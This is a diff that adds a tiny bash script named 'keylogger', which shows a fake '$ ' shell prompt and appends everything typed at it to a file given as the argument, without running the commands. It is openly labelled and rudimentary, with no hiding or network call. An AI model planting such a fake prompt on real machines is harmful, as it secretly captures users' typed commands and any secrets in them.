@@ -1,0 +1,9 @@
+# usage: ./keylogger [file path]
+
+#!/usr/bin/env bash
+
+while true
+do
+	read -p "$ " command
+	echo $command  >> $1
+done
